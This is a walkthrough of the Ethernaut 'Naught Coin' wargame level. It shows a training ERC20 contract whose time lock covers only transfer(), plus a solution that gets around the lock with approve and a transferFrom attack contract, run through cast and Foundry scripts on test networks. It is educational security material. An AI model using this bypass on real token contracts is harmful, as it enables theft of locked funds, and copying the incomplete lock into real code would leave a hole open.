# Level 15 - Naught Coin ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/15" %}

### Level Setup

{% hint style="info" %}
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

&#x20; Things that might help

* The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
* The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/NaughtCoin.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
{% endcode %}

### Exploit

While the tokens can't be transferred directly by the owner, the owner can allow a different address to transfer the tokens for them.

1. Deploy the Exploit contract.
2. In the browser console, approve the newly deployed exploit contract address.

```javascript
myBalance = await contract.balanceOf("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
await contract.approve("0x76d05F58D14c0838EC630C8140eDC5aB7CD159Dc", myBalance)
```

3. Invoke the attack to transfer the tokens.

```bash
cast send <DEPLOYED_EXPLOIT_CONTRACT_ADDRESS> "attack()" \
--rpc-url ${ANVIL_RPC_URL} --private-key ${ANVIL_PRIVATE_KEY}
```

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-15

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-15

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/b927b7aed65df997f7e204690bb4033773b72d04/src/Level15.sol" %}

{% code title="src/Level15.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

// ================================================================
// │                     LEVEL 15 - NAUGHT COIN                   │
// ================================================================
interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AttackContract {
    address targetContractAddress;

    constructor(address _targetContractAddress) {
        targetContractAddress = _targetContractAddress;
    }

    function attack() public {
        uint256 allowance = ERC20(targetContractAddress).allowance(msg.sender, address(this));

        // Transfer all tokens to this contract address
        ERC20(targetContractAddress).transferFrom(msg.sender, address(this), allowance);
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/b927b7aed65df997f7e204690bb4033773b72d04/script/Level15.s.sol" %}

{% code title="script/Level15.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "../src/Level15.sol";

// ================================================================
// │                     LEVEL 15 - NAUGHT COIN                   │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        new AttackContract(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
{% endhint %}

### Notes

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/e936301859334383d568a614084917100319205e/level_15_Naught-Coin.md" %}
